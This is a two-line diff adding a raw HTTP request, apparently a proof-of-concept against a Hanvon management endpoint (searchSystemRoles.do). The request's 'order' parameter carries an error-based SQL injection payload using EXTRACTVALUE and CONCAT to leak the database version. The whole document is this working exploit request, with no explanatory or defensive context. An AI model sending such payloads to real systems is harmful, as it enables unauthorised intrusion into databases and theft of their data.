@@ -1,0 +1,2 @@
+GET /manage/systemRoleMgr/searchSystemRoles.do?branchId=1&columnKey=id&deviceName=test&id=1&order=OR+EXTRACTVALUE(2605,CONCAT(0x5c,@@version,0x5c,(SELECT+(ELT(2605=2605,1)))))&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
+Host: hanvon.mrxn.net
